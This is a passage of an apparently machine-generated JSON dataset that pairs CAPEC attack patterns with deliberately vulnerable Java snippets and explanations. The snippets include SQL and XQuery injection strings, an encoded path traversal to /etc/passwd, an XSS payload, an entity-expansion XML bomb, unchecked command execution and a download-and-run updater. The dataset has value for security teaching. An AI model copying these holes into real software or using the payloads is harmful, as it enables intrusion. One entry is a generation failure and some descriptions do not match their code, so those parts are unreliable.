        "code_snippet": "import java.io.*;\nimport java.net.*;\n\npublic class VulnerableCodeDownloader {\n    public static void main(String[] args) {\n        try {\n            URL url = new URL(\"http://example.com/update.jar\");\n            HttpURLConnection connection = (HttpURLConnection) url.openConnection();\n            InputStream inputStream = connection.getInputStream();\n            FileOutputStream outputStream = new FileOutputStream(\"update.jar\");\n\n            byte[] buffer = new byte[1024];\n            int bytesRead;\n            while ((bytesRead = inputStream.read(buffer)) != -1) {\n                outputStream.write(buffer, 0, bytesRead);\n            }\n\n            inputStream.close();\n            outputStream.close();\n\n            // Load and execute the downloaded code\n            ProcessBuilder pb = new ProcessBuilder(\"java\", \"-jar\", \"update.jar\");\n            pb.start();\n        } catch (IOException e) {\n            e.printStackTrace();\n        }\n    }\n}",
        "description": "This Java code snippet demonstrates a vulnerable code downloader that embodies the main idea of CAPEC-192: Sniff Application Code. The code downloads an update from a remote server over HTTP (cleartext transmission) and executes it without verifying its integrity or origin. This represents CWE-319 (Cleartext Transmission of Sensitive Information), CWE-311 (Missing Encryption of Sensitive Data), and CWE-494 (Download of Code Without Integrity Check). The lack of encryption and integrity checks makes the code susceptible to interception and tampering by an adversary, who could then exploit the trust relationship between the client and server."
    },
    {
        "capec_id": "66",
        "capec_name": "SQL Injection",
        "code_snippet": "import java.sql.Connection;\nimport java.sql.DriverManager;\nimport java.sql.ResultSet;\nimport java.sql.SQLException;\nimport java.sql.Statement;\n\npublic class SQLInjectionExample {\n    public static void main(String[] args) {\n        String userInput = \"' OR '1'='1\"; // Malicious input\n        String query = \"SELECT * FROM users WHERE username = '\" + userInput + \"'\";\n\n        try (Connection connection = DriverManager.getConnection(\"jdbc:mysql://localhost:3306/mydatabase\", \"user\", \"password\");\n             Statement statement = connection.createStatement();\n             ResultSet resultSet = statement.executeQuery(query)) {\n\n            while (resultSet.next()) {\n                System.out.println(\"User: \" + resultSet.getString(\"username\"));\n            }\n        } catch (SQLException e) {\n            e.printStackTrace();\n        }\n    }\n}",
        "description": "This Java code snippet demonstrates a classic SQL Injection vulnerability. The code constructs an SQL query by directly concatenating user input into the query string without proper validation or neutralization. The user input is crafted to manipulate the SQL query, potentially allowing an attacker to bypass authentication or retrieve all records from the 'users' table. This example highlights the importance of validating and sanitizing user inputs to prevent SQL Injection attacks. The code also includes a potential CWE-209 issue by printing the stack trace, which could expose sensitive information in error messages."
    },
    {
        "capec_id": "67",
        "capec_name": "String Format Overflow in syslog()",
        "code_snippet": "import java.util.logging.Logger;\n\npublic class VulnerableSyslog {\n    private static final Logger logger = Logger.getLogger(VulnerableSyslog.class.getName());\n\n    public static void logMessage(String userInput) {\n        // CWE-134: Use of Externally-Controlled Format String\n        // CWE-20: Improper Input Validation\n        // CWE-74: Improper Neutralization of Special Elements in Output Used by a Downstream Component\n        // CWE-120: Buffer Copy without Checking Size of Input\n        // CWE-680: Integer Overflow to Buffer Overflow\n        // CWE-697: Incorrect Comparison\n        logger.info(String.format(userInput));\n    }\n\n    public static void main(String[] args) {\n        // Simulate user input\n        String userInput = \"%x %x %x %x\";\n        logMessage(userInput);\n    }\n}",
        "description": "This Java code snippet demonstrates a vulnerable use of the `Logger` class, specifically the `String.format` method, which is analogous to the `syslog()` function in C. The `logMessage` method takes user input directly and uses it as a format string without proper validation or neutralization, leading to a format string injection vulnerability (CWE-134). This can result in various security issues, including buffer overflows (CWE-120, CWE-680) and improper handling of special elements (CWE-74). The code also lacks proper input validation (CWE-20) and could lead to incorrect comparisons in a security context (CWE-697). The `main` method simulates an attack by passing a malicious format string as user input."
    },
    {
        "capec_id": "68",
        "capec_name": "Subvert Code-signing Facilities",
        "code_snippet": "import java.security.*;\nimport java.util.Base64;\n\npublic class CodeSigningExample {\n    public static void main(String[] args) throws Exception {\n        String data = \"Sensitive Data\";\n        KeyPairGenerator keyGen = KeyPairGenerator.getInstance(\"RSA\");\n        keyGen.initialize(2048);\n        KeyPair pair = keyGen.generateKeyPair();\n        PrivateKey privateKey = pair.getPrivate();\n        PublicKey publicKey = pair.getPublic();\n\n        // Sign the data\n        Signature signature = Signature.getInstance(\"SHA1withRSA\"); // CWE-328: Use of Weak Hash\n        signature.initSign(privateKey);\n        signature.update(data.getBytes());\n        byte[] signedData = signature.sign();\n        System.out.println(\"Signed Data: \" + Base64.getEncoder().encodeToString(signedData));\n\n        // Verify the signature\n        signature.initVerify(publicKey);\n        signature.update(data.getBytes());\n        boolean isVerified = signature.verify(signedData);\n        System.out.println(\"Signature Verified: \" + isVerified);\n\n        // CWE-325: Missing Cryptographic Step - No validation of the public key\n        // CWE-1326: Missing Immutable Root of Trust in Hardware - No hardware-based root of trust\n        // CWE-733: Compiler Optimization Removal or Modification of Security-critical Code - Potentially optimized out security checks\n        // CWE-506: Embedded Malicious Code - Potential for malicious code to be embedded\n    }\n}",
        "description": "This Java code snippet demonstrates a basic example of code signing and verification using RSA. The code generates a key pair, signs a piece of data with the private key, and then verifies the signature with the public key. However, it embodies several vulnerabilities related to the CAPEC 'Subvert Code-signing Facilities':\n\n1. **CWE-328: Use of Weak Hash** - The code uses 'SHA1withRSA', which is a weak hash function and susceptible to various attacks.\n2. **CWE-325: Missing Cryptographic Step** - The code does not validate the public key, which is a critical step in ensuring the integrity of the key pair.\n3. **CWE-1326: Missing Immutable Root of Trust in Hardware** - The code does not leverage any hardware-based root of trust, making it easier to bypass secure boot mechanisms.\n4. **CWE-733: Compiler Optimization Removal or Modification of Security-critical Code** - The code might be optimized by the compiler in a way that removes or alters security-critical checks.\n5. **CWE-506: Embedded Malicious Code** - The code could potentially include or be modified to include malicious code, which could be signed and trusted without proper validation.\n\nThis example highlights how subverting code-signing mechanisms can lead to significant security vulnerabilities, allowing attackers to escalate privileges or execute malicious code."
    },
    {
        "capec_id": "69",
        "capec_name": "Target Programs with Elevated Privileges",
        "code_snippet": "import java.io.BufferedReader;\nimport java.io.InputStreamReader;\n\npublic class PrivilegedCommandExecutor {\n    public static void main(String[] args) {\n        try {\n            // CWE-250: Execution with Unnecessary Privileges\n            if (args.length > 0 && args[0].equals(\"admin\")) {\n                // CWE-15: External Control of System or Configuration Setting\n                String command = args[1];\n                // CWE-78: Improper Neutralization of Special Elements used in an OS Command\n                Process process = Runtime.getRuntime().exec(command);\n                BufferedReader reader = new BufferedReader(new InputStreamReader(process.getInputStream()));\n                String line;\n                while ((line = reader.readLine()) != null) {\n                    System.out.println(line);\n                }\n                process.waitFor();\n            } else {\n                System.out.println(\"Insufficient privileges.\");\n            }\n        } catch (Exception e) {\n            e.printStackTrace();\n        }\n    }\n}",
        "description": "This Java code snippet demonstrates a program that executes commands with elevated privileges based on user input. The main idea of the CAPEC is represented by targeting a program running with elevated privileges. The code checks if the first argument is 'admin' (CWE-250: Execution with Unnecessary Privileges) and then executes a command provided by the user (CWE-15: External Control of System or Configuration Setting). The command is executed without proper sanitization (CWE-78: Improper Neutralization of Special Elements used in an OS Command), making it vulnerable to OS command injection attacks. This snippet highlights the risks of executing commands with elevated privileges based on external input without proper validation."
    },
    {
        "capec_id": "70",
        "capec_name": "Try Common or Default Usernames and Passwords",
        "code_snippet": "import java.util.HashMap;\nimport java.util.Map;\n\npublic class VulnerableLogin {\n    private static final Map<String, String> users = new HashMap<>();\n    \n    static {\n        // CWE-798: Use of Hard-coded Credentials\n        users.put(\"admin\", \"admin\"); // Default credentials\n        users.put(\"user\", \"password\"); // Weak password\n    }\n    \n    public static boolean login(String username, String password) {\n        // CWE-654: Reliance on a Single Factor in a Security Decision\n        // CWE-308: Use of Single-factor Authentication\n        if (users.containsKey(username) && users.get(username).equals(password)) {\n            return true;\n        }\n        return false;\n    }\n    \n    public static void main(String[] args) {\n        // Example usage\n        System.out.println(login(\"admin\", \"admin\")); // Should return true\n        System.out.println(login(\"user\", \"password\")); // Should return true\n        System.out.println(login(\"user\", \"wrongpassword\")); // Should return false\n    }\n}",
        "description": "This Java code snippet demonstrates a vulnerable login system that embodies the main idea of the CAPEC 'Try Common or Default Usernames and Passwords'. The code uses hard-coded credentials (CWE-798) for users, including default and weak passwords. The login method relies on single-factor authentication (CWE-654, CWE-308) by checking only the username and password against the hard-coded values. This makes the system susceptible to attacks using common or default credentials. The main method shows example usage of the login function, highlighting the vulnerability."
    },
    {
        "capec_id": "71",
        "capec_name": "Using Unicode Encoding to Bypass Validation Logic",
        "code_snippet": "import java.nio.charset.StandardCharsets;\nimport java.util.regex.Pattern;\n\npublic class UnicodeValidationBypass {\n    public static void main(String[] args) {\n        String userInput = \"\\u003Cscript\\u003Ealert('XSS')\\u003C/script\\u003E\";\n        if (isValidInput(userInput)) {\n            System.out.println(\"Input is valid: \" + userInput);\n        } else {\n            System.out.println(\"Input is invalid.\");\n        }\n    }\n\n    public static boolean isValidInput(String input) {\n        // Early validation before canonicalization\n        if (!Pattern.matches(\"^[a-zA-Z0-9]*$\", input)) {\n            return false;\n        }\n        // Canonicalize the input\n        String canonicalInput = new String(input.getBytes(StandardCharsets.UTF_8), StandardCharsets.UTF_8);\n        // Validate again after canonicalization\n        return Pattern.matches(\"^[a-zA-Z0-9]*$\", canonicalInput);\n    }\n}",
        "description": "This Java code snippet demonstrates a vulnerability where Unicode encoding can be used to bypass validation logic. The `isValidInput` method first performs input validation using a regular expression to check if the input contains only alphanumeric characters. However, this validation is done before canonicalizing the input, which means that Unicode-encoded characters can bypass this check. After canonicalization, the input is validated again, but by this time, the malicious input has already bypassed the initial validation. This embodies the CAPEC's main idea of using Unicode encoding to bypass validation logic, and it also touches on related CWEs such as improper handling of Unicode encoding (CWE-176), early validation (CWE-179), and improper input validation (CWE-20)."
    },
    {
        "capec_id": "72",
        "capec_name": "URL Encoding",
        "code_snippet": "import java.io.*;\nimport java.net.*;\n\npublic class URLDecoderExample {\n    public static void main(String[] args) {\n        try {\n            String encodedUrl = \"%2E%2E%2F%2E%2E%2Fetc%2Fpasswd\"; // Encoded URL representing '../../etc/passwd'\n            String decodedUrl = URLDecoder.decode(encodedUrl, \"UTF-8\");\n            System.out.println(\"Decoded URL: \" + decodedUrl);\n\n            // Vulnerable file access based on decoded URL\n            File file = new File(decodedUrl);\n            BufferedReader reader = new BufferedReader(new FileReader(file));\n            String line;\n            while ((line = reader.readLine()) != null) {\n                System.out.println(line);\n            }\n            reader.close();\n        } catch (IOException e) {\n            e.printStackTrace();\n        }\n    }\n}",
        "description": "This Java code snippet demonstrates a vulnerability related to improper handling of URL encoding. The encoded URL '%2E%2E%2F%2E%2E%2Fetc%2Fpasswd' is decoded to '../../etc/passwd', which is then used to access the file system. This can lead to a directory traversal attack, where an attacker can access sensitive files on the server. The code does not properly validate or sanitize the decoded URL, making it susceptible to CWE-73 (External Control of File Name or Path) and CWE-20 (Improper Input Validation). The example highlights the importance of correctly handling and validating URL-encoded input to prevent security vulnerabilities."
    },
    {
        "capec_id": "73",
        "capec_name": "User-Controlled Filename",
        "code_snippet": "import java.io.*;\nimport javax.servlet.*;\nimport javax.servlet.http.*;\n\npublic class FileUploadServlet extends HttpServlet {\n    protected void doPost(HttpServletRequest request, HttpServletResponse response) throws ServletException, IOException {\n        String fileName = request.getParameter(\"fileName\");\n        String fileContent = request.getParameter(\"fileContent\");\n\n        // Vulnerable code: No input validation or encoding\n        File file = new File(\"/uploads/\" + fileName);\n        try (FileWriter writer = new FileWriter(file)) {\n            writer.write(fileContent);\n        }\n\n        // Display the uploaded file name in the response\n        response.setContentType(\"text/html\");\n        PrintWriter out = response.getWriter();\n        out.println(\"<html><body>\");\n        out.println(\"File \" + fileName + \" uploaded successfully.\");\n        out.println(\"</body></html>\");\n    }\n}",
        "description": "This Java servlet code snippet demonstrates a vulnerable file upload functionality. The code takes a filename and file content from the user via HTTP POST request parameters and writes the content to a file on the server. The filename is then displayed back to the user in an HTML response. The vulnerability lies in the lack of input validation and encoding for the filename and file content, which can lead to various attacks such as XSS (Cross-Site Scripting) and code injection. An attacker can exploit this by providing a malicious filename or file content that includes executable code or HTML tags, which can then be executed in the client's browser or on the server."
    },
    {
        "capec_id": "74",
        "capec_name": "Manipulating State",
        "code_snippet": "import javax.servlet.http.Cookie;\nimport javax.servlet.http.HttpServletRequest;\nimport javax.servlet.http.HttpServletResponse;\nimport java.io.IOException;\n\npublic class StateManipulationExample {\n    public void handleRequest(HttpServletRequest request, HttpServletResponse response) throws IOException {\n        // CWE-315: Cleartext Storage of Sensitive Information in a Cookie\n        Cookie userCookie = new Cookie(\"user\", \"admin\");\n        response.addCookie(userCookie);\n\n        // CWE-372: Incomplete Internal State Distinction\n        String userRole = request.getParameter(\"role\");\n        if (userRole.equals(\"admin\")) {\n            // Perform admin-specific operations\n            response.getWriter().println(\"Welcome, admin!\");\n        } else {\n            // Perform user-specific operations\n            response.getWriter().println(\"Welcome, user!\");\n        }\n\n        // CWE-693: Protection Mechanism Failure\n        if (request.isSecure()) {\n            response.getWriter().println(\"Secure connection established.\");\n        } else {\n            response.getWriter().println(\"Warning: Connection is not secure.\");\n        }\n    }\n}",
        "description": "This Java code snippet demonstrates a web application handling user requests and manipulating state information. It embodies the main idea of CAPEC-133: Manipulating State, by showing how an adversary could exploit state management vulnerabilities. The code includes CWE-315 by storing sensitive information (user role) in cleartext within a cookie, making it susceptible to interception and manipulation. CWE-372 is represented by the improper distinction of internal states, where the application assumes the user role based on a parameter that can be tampered with. CWE-693 is demonstrated by the lack of proper protection mechanisms, where the application does not enforce secure connections, potentially exposing sensitive operations to attackers."
    },
    {
        "capec_id": "75",
        "capec_name": "Manipulating Writeable Configuration Files",
        "code_snippet": "import java.io.*;\nimport java.util.Properties;\n\npublic class ConfigManager {\n    private Properties config;\n    private File configFile;\n\n    public ConfigManager(String filePath) throws IOException {\n        configFile = new File(filePath);\n        config = new Properties();\n        loadConfig();\n    }\n\n    private void loadConfig() throws IOException {\n        try (FileInputStream fis = new FileInputStream(configFile)) {\n            config.load(fis);\n        }\n    }\n\n    public String getConfigValue(String key) {\n        return config.getProperty(key);\n    }\n\n    public void setConfigValue(String key, String value) throws IOException {\n        config.setProperty(key, value);\n        saveConfig();\n    }\n\n    private void saveConfig() throws IOException {\n        try (FileOutputStream fos = new FileOutputStream(configFile)) {\n            config.store(fos, null);\n        }\n    }\n\n    public static void main(String[] args) {\n        try {\n            ConfigManager manager = new ConfigManager(\"config.properties\");\n            manager.setConfigValue(\"username\", \"admin\");\n            System.out.println(\"Username: \" + manager.getConfigValue(\"username\"));\n        } catch (IOException e) {\n            e.printStackTrace();\n        }\n    }\n}",
        "description": "This Java code snippet demonstrates a simple configuration manager that reads and writes to a configuration file. The `ConfigManager` class loads configuration properties from a file, allows retrieval and modification of these properties, and saves the changes back to the file. The code embodies the CAPEC concept of 'Manipulating Writeable Configuration Files' by showing how an attacker could potentially modify configuration settings if they have write access to the configuration file. The related CWEs are represented as follows:\n\n- CWE-349: The code does not differentiate between trusted and untrusted data when loading properties, potentially accepting malicious input.\n- CWE-99: The file path for the configuration file is taken directly from user input without validation, leading to potential resource injection.\n- CWE-77: The code does not neutralize special elements in the configuration values, which could lead to command injection if these values are used in system commands.\n- CWE-346: The code does not validate the origin of the configuration file, assuming it is always legitimate.\n- CWE-353 and CWE-354: The code does not include or validate integrity checks for the configuration file, making it susceptible to tampering during transmission or storage."
    },
    {
        "capec_id": "76",
        "capec_name": "Manipulating Web Input to File System Calls",
        "code_snippet": "import java.io.*;\nimport javax.servlet.*;\nimport javax.servlet.http.*;\n\npublic class FileServlet extends HttpServlet {\n    protected void doGet(HttpServletRequest request, HttpServletResponse response) throws ServletException, IOException {\n        String fileName = request.getParameter(\"file\");\n        File file = new File(\"/var/www/uploads/\" + fileName);\n        \n        if (file.exists() && !file.isDirectory()) {\n            FileInputStream fis = new FileInputStream(file);\n            response.setContentType(\"application/octet-stream\");\n            response.setHeader(\"Content-Disposition\", \"attachment; filename=\" + fileName);\n            \n            OutputStream os = response.getOutputStream();\n            byte[] buffer = new byte[1024];\n            int bytesRead;\n            while ((bytesRead = fis.read(buffer)) != -1) {\n                os.write(buffer, 0, bytesRead);\n            }\n            fis.close();\n            os.close();\n        } else {\n            response.sendError(HttpServletResponse.SC_NOT_FOUND);\n        }\n    }\n}",
        "description": "This Java servlet code snippet demonstrates a vulnerability related to 'Manipulating Web Input to File System Calls'. The code takes a 'file' parameter from an HTTP GET request and uses it to construct a file path. It then attempts to serve the file to the client if it exists. This code is vulnerable to several CWE weaknesses:\n\n1. **Relative Path Traversal (CWE-23)**: The 'file' parameter is not properly sanitized, allowing an attacker to use sequences like '../' to access files outside the intended directory.\n2. **Improper Limitation of a Pathname to a Restricted Directory (CWE-22)**: The code does not neutralize special elements in the pathname, potentially allowing access to files outside the restricted directory.\n3. **External Control of File Name or Path (CWE-73)**: The file path is directly influenced by user input, which can be manipulated by an attacker.\n4. **Improper Authorization (CWE-285)**: The code does not perform any authorization checks to ensure the user is allowed to access the requested file.\n\nThis code snippet represents the main idea of the CAPEC by showing how an attacker can manipulate web input to gain unintended access to the file system."
    },
    {
        "capec_id": "77",
        "capec_name": "Manipulating User-Controlled Variables",
        "code_snippet": "import java.util.Map;\n\npublic class UserControlledVariables {\n    private boolean isAdmin = false;\n    private String debugMode = \"OFF\";\n\n    public void updateSettings(Map<String, String> userInput) {\n        // Directly using user input without validation\n        if (userInput.containsKey(\"isAdmin\")) {\n            isAdmin = Boolean.parseBoolean(userInput.get(\"isAdmin\"));\n        }\n        if (userInput.containsKey(\"debugMode\")) {\n            debugMode = userInput.get(\"debugMode\");\n        }\n    }\n\n    public void performAction() {\n        if (isAdmin) {\n            System.out.println(\"Admin privileges granted.\");\n        } else {\n            System.out.println(\"User privileges granted.\");\n        }\n\n        if (\"ON\".equals(debugMode)) {\n            System.out.println(\"Debug mode is ON.\");\n        } else {\n            System.out.println(\"Debug mode is OFF.\");\n        }\n    }\n\n    public static void main(String[] args) {\n        UserControlledVariables ucv = new UserControlledVariables();\n        Map<String, String> userInput = Map.of(\"isAdmin\", \"true\", \"debugMode\", \"ON\");\n        ucv.updateSettings(userInput);\n        ucv.performAction();\n    }\n}",
        "description": "This Java code snippet demonstrates the vulnerability described in the CAPEC by directly using user-controlled variables without proper validation or sanitization. The `updateSettings` method takes a map of user inputs and directly assigns them to critical variables like `isAdmin` and `debugMode`. This can lead to severe security issues such as unauthorized access (CWE-285) and enabling debug mode (CWE-15). The `performAction` method then uses these variables to determine the level of access and debug mode status, showcasing how an attacker could manipulate the application's behavior by providing malicious input."
    },
    {
        "capec_id": "78",
        "capec_name": "Using Escaped Slashes in Alternate Encoding",
        "code_snippet": "import java.io.*;\nimport javax.servlet.*;\nimport javax.servlet.http.*;\n\npublic class VulnerableServlet extends HttpServlet {\n    protected void doGet(HttpServletRequest request, HttpServletResponse response) throws ServletException, IOException {\n        String filePath = request.getParameter(\"file\");\n        \n        // CWE-20: Improper Input Validation\n        if (filePath == null || filePath.isEmpty()) {\n            response.sendError(HttpServletResponse.SC_BAD_REQUEST, \"File path is missing\");\n            return;\n        }\n        \n        // CWE-22: Path Traversal\n        File file = new File(\"/var/www/uploads/\" + filePath);\n        if (!file.getCanonicalPath().startsWith(\"/var/www/uploads/\")) {\n            response.sendError(HttpServletResponse.SC_FORBIDDEN, \"Invalid file path\");\n            return;\n        }\n        \n        // CWE-180: Validate Before Canonicalize\n        if (filePath.contains(\"..\")) {\n            response.sendError(HttpServletResponse.SC_FORBIDDEN, \"Invalid file path\");\n            return;\n        }\n        \n        // CWE-74: Improper Neutralization of Special Elements\n        filePath = filePath.replace(\"\\\\\", \"\");\n        \n        // CWE-73: External Control of File Name or Path\n        FileInputStream fis = new FileInputStream(file);\n        response.setContentType(\"application/octet-stream\");\n        OutputStream os = response.getOutputStream();\n        byte[] buffer = new byte[1024];\n        int bytesRead;\n        while ((bytesRead = fis.read(buffer)) != -1) {\n            os.write(buffer, 0, bytesRead);\n        }\n        fis.close();\n        os.close();\n    }\n}",
        "description": "This Java servlet code demonstrates a vulnerability related to the CAPEC 'Using Escaped Slashes in Alternate Encoding'. The code allows a user to specify a file path via a request parameter, which is then used to read and serve a file from the server's filesystem. The code contains several weaknesses: \n1. CWE-20: Improper Input Validation - The input is not properly validated, allowing potentially dangerous paths.\n2. CWE-22: Path Traversal - The code attempts to prevent path traversal by checking the canonical path but does not handle all edge cases.\n3. CWE-180: Validate Before Canonicalize - The code validates the input before canonicalizing it, which can lead to bypassing the validation.\n4. CWE-74: Improper Neutralization of Special Elements - The code attempts to neutralize backslashes but does so incorrectly, potentially allowing alternate encodings to bypass filters.\n5. CWE-73: External Control of File Name or Path - The file path is directly influenced by user input, leading to potential security risks.\nThis code snippet highlights the importance of proper input validation, canonicalization, and neutralization to prevent security vulnerabilities."
    },
    {
        "capec_id": "79",
        "capec_name": "Using Slashes in Alternate Encoding",
        "code_snippet": "import java.io.*;\nimport javax.servlet.*;\nimport javax.servlet.http.*;\n\npublic class VulnerableServlet extends HttpServlet {\n    protected void doGet(HttpServletRequest request, HttpServletResponse response) throws ServletException, IOException {\n        String filePath = request.getParameter(\"file\");\n        \n        // Validate input before canonicalization\n        if (filePath.contains(\"..\") || filePath.contains(\"\\\\\")) {\n            response.sendError(HttpServletResponse.SC_BAD_REQUEST, \"Invalid file path\");\n            return;\n        }\n        \n        // Canonicalize the file path\n        File file = new File(\"/var/www/html/\" + filePath).getCanonicalFile();\n        \n        // Check if the file is within the allowed directory\n        if (!file.getPath().startsWith(\"/var/www/html/\")) {\n            response.sendError(HttpServletResponse.SC_FORBIDDEN, \"Access denied\");\n            return;\n        }\n        \n        // Read and serve the file\n        try (BufferedReader reader = new BufferedReader(new FileReader(file))) {\n            String line;\n            while ((line = reader.readLine()) != null) {\n                response.getWriter().println(line);\n            }\n        } catch (FileNotFoundException e) {\n            response.sendError(HttpServletResponse.SC_NOT_FOUND, \"File not found\");\n        }\n    }\n}",
        "description": "This Java servlet code snippet demonstrates a vulnerability related to the CAPEC 'Using Slashes in Alternate Encoding'. The code attempts to validate the file path input from the user before canonicalizing it, which is a common mistake (CWE-180). The validation checks for '..' and '\\\\' characters to prevent directory traversal attacks, but it does so before converting the path to its canonical form. This can be exploited by an attacker using alternate encodings of slashes to bypass the validation checks. The code also demonstrates improper input validation (CWE-20) and potential path traversal issues (CWE-22) by allowing user input to influence file paths without proper neutralization of special elements. The goal of this example is to highlight the importance of canonicalizing paths before validation to prevent such vulnerabilities."
    },
    {
        "capec_id": "80",
        "capec_name": "Using UTF-8 Encoding to Bypass Validation Logic",
        "code_snippet": "import java.nio.charset.StandardCharsets;\nimport java.util.regex.Pattern;\n\npublic class UTF8ValidationBypass {\n    public static void main(String[] args) {\n        String userInput = \"\\u00C0\\u0080\"; // Overlong UTF-8 encoding for null character\n        if (isValidInput(userInput)) {\n            System.out.println(\"Input is valid\");\n        } else {\n            System.out.println(\"Input is invalid\");\n        }\n    }\n\n    public static boolean isValidInput(String input) {\n        // Validate input before canonicalization\n        if (!Pattern.matches(\"^[a-zA-Z0-9]*$\", input)) {\n            return false;\n        }\n        // Canonicalize input\n        String canonicalInput = new String(input.getBytes(StandardCharsets.UTF_8), StandardCharsets.UTF_8);\n        // Further processing...\n        return true;\n    }\n}",
        "description": "This Java code snippet demonstrates a vulnerability where UTF-8 encoding is used to bypass validation logic. The `isValidInput` method first validates the input using a regex pattern before canonicalizing it. This is an example of CWE-180 (Incorrect Behavior Order: Validate Before Canonicalize). The input `\\u00C0\\u0080` is an overlong UTF-8 encoding for the null character, which can bypass the initial validation check. The code highlights the risk of improper handling of alternate encodings (CWE-173) and encoding errors (CWE-172), leading to potential security issues."
    },
    {
        "capec_id": "81",
        "capec_name": "Web Server Logs Tampering",
        "code_snippet": "import java.io.FileWriter;\nimport java.io.IOException;\nimport javax.servlet.http.HttpServletRequest;\n\npublic class WebServerLogTampering {\n    public void logRequest(HttpServletRequest request) {\n        String userInput = request.getParameter(\"userInput\");\n        try (FileWriter fw = new FileWriter(\"webserver.log\", true)) {\n            // CWE-117: Improper Output Neutralization for Logs\n            // CWE-93: Improper Neutralization of CRLF Sequences\n            // CWE-75: Failure to Sanitize Special Elements\n            // CWE-116: Improper Encoding or Escaping of Output\n            String sanitizedInput = userInput.replaceAll(\"[\\r\\n]\", \"\").replaceAll(\"<\", \"&lt;\").replaceAll(\">\", \"&gt;\");\n            fw.write(\"User Input: \" + sanitizedInput + \"\\n\");\n        } catch (IOException e) {\n            e.printStackTrace();\n        }\n    }\n}",
        "description": "This Java code snippet demonstrates a basic logging mechanism for a web server that logs user input. The `logRequest` method takes an `HttpServletRequest` object, retrieves a parameter named `userInput`, and writes it to a log file named `webserver.log`. To prevent Web Server Logs Tampering attacks, the code sanitizes the user input by removing CRLF sequences and encoding special characters like '<' and '>'. This addresses several CWEs: CWE-117 (Improper Output Neutralization for Logs), CWE-93 (Improper Neutralization of CRLF Sequences), CWE-75 (Failure to Sanitize Special Elements), and CWE-116 (Improper Encoding or Escaping of Output). The main idea is to ensure that the log entries are safe and cannot be manipulated to hide malicious activities or inject harmful data."
    },
    {
        "capec_id": "82",
        "capec_name": "DEPRECATED: Violating Implicit Assumptions Regarding XML Content (aka XML Denial of Service (XDoS))",
        "code_snippet": "import javax.xml.parsers.DocumentBuilderFactory;\nimport javax.xml.parsers.DocumentBuilder;\nimport org.w3c.dom.Document;\nimport java.io.StringReader;\nimport javax.xml.XMLConstants;\nimport javax.xml.transform.stream.StreamSource;\nimport javax.xml.validation.SchemaFactory;\nimport javax.xml.validation.Schema;\nimport javax.xml.validation.Validator;\nimport org.xml.sax.SAXException;\nimport java.io.IOException;\n\npublic class VulnerableXMLParser {\n    public static void main(String[] args) {\n        String xmlData = \"<?xml version=\\\"1.0\\\"?>\\n\" +\n                         \"<!DOCTYPE root [\\n\" +\n                         \"<!ENTITY lol 'lol'>\\n\" +\n                         \"<!ENTITY lol2 '&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;'>\\n\" +\n                         \"]>\\n\" +\n                         \"<root>&lol2;</root>\";\n\n        try {\n            DocumentBuilderFactory factory = DocumentBuilderFactory.newInstance();\n            factory.setFeature(XMLConstants.FEATURE_SECURE_PROCESSING, false); // Vulnerable setting\n            DocumentBuilder builder = factory.newDocumentBuilder();\n            Document doc = builder.parse(new InputSource(new StringReader(xmlData)));\n            System.out.println(\"Parsed XML: \" + doc.getDocumentElement().getTextContent());\n        } catch (Exception e) {\n            e.printStackTrace();\n        }\n    }\n}",
        "description": "This Java code snippet demonstrates a vulnerable XML parser that is susceptible to XML Entity Expansion (CWE-776). The code does not properly restrict recursive entity references in DTDs, leading to potential denial of service (XDoS) attacks. The `DocumentBuilderFactory` is configured with `XMLConstants.FEATURE_SECURE_PROCESSING` set to `false`, which makes the parser vulnerable to malicious XML payloads containing recursive entity definitions. The provided XML data includes such recursive entities, which can cause the parser to consume excessive resources, leading to a denial of service."
    },
    {
        "capec_id": "83",
        "capec_name": "XPath Injection",
        "code_snippet": "User intervention needed!",
        "description": "The model failed to generate a description for this code snippet. Error: Could not parse response content as the length limit was reached"
    },
    {
        "capec_id": "84",
        "capec_name": "XQuery Injection",
        "code_snippet": "import javax.xml.xquery.XQConnection;\nimport javax.xml.xquery.XQDataSource;\nimport javax.xml.xquery.XQException;\nimport javax.xml.xquery.XQPreparedExpression;\nimport javax.xml.xquery.XQResultSequence;\nimport net.xqj.exist.ExistXQDataSource;\n\npublic class XQueryInjectionExample {\n    public static void main(String[] args) {\n        String userInput = \"' or '1'='1\"; // Simulated malicious input\n        String xquery = \"for $user in doc('users.xml')/users/user where $user/name = '\" + userInput + \"' return $user\";\n\n        try {\n            XQDataSource xqs = new ExistXQDataSource();\n            XQConnection conn = xqs.getConnection();\n            XQPreparedExpression exp = conn.prepareExpression(xquery);\n            XQResultSequence result = exp.executeQuery();\n\n            while (result.next()) {\n                System.out.println(result.getItemAsString(null));\n            }\n\n            conn.close();\n        } catch (XQException e) {\n            e.printStackTrace();\n        }\n    }\n}",
        "description": "This Java code snippet demonstrates a vulnerable XQuery injection scenario. The code constructs an XQuery expression using unvalidated user input, which is then executed against an XML database. The user input is directly concatenated into the XQuery string, allowing an attacker to manipulate the query structure. This can lead to unauthorized data access or other malicious actions, similar to SQL injection vulnerabilities. The code highlights the importance of properly neutralizing user input to prevent injection attacks."
    },
    {
        "capec_id": "85",
        "capec_name": "AJAX Footprinting",
        "code_snippet": "import javax.servlet.http.HttpServlet;\nimport javax.servlet.http.HttpServletRequest;\nimport javax.servlet.http.HttpServletResponse;\nimport java.io.IOException;\nimport java.io.PrintWriter;\n\npublic class VulnerableAjaxServlet extends HttpServlet {\n    protected void doGet(HttpServletRequest request, HttpServletResponse response) throws IOException {\n        String param = request.getParameter(\"input\");\n        response.setContentType(\"text/html\");\n        PrintWriter out = response.getWriter();\n        // Vulnerable to XSS (CWE-79) and improper input validation (CWE-20)\n        out.println(\"<html><body>\" + param + \"</body></html>\");\n    }\n\n    protected void doPost(HttpServletRequest request, HttpServletResponse response) throws IOException {\n        String param = request.getParameter(\"input\");\n        response.setContentType(\"text/html\");\n        PrintWriter out = response.getWriter();\n        // Vulnerable to HTTP Response Splitting (CWE-113)\n        response.setHeader(\"Custom-Header\", \"Value: \" + param);\n        out.println(\"<html><body>Header set</body></html>\");\n    }\n}",
        "description": "This Java servlet demonstrates vulnerabilities related to AJAX footprinting and several CWEs. The `doGet` method takes a user input parameter and directly includes it in the HTML response without proper validation or encoding, making it vulnerable to Cross-Site Scripting (CWE-79) and Improper Input Validation (CWE-20). The `doPost` method sets a custom HTTP header using user input without neutralizing CRLF sequences, making it vulnerable to HTTP Response Splitting (CWE-113). These vulnerabilities can be exploited by attackers to gather information about the system and launch further attacks."
    },
    {
        "capec_id": "86",
        "capec_name": "XSS Through HTTP Headers",
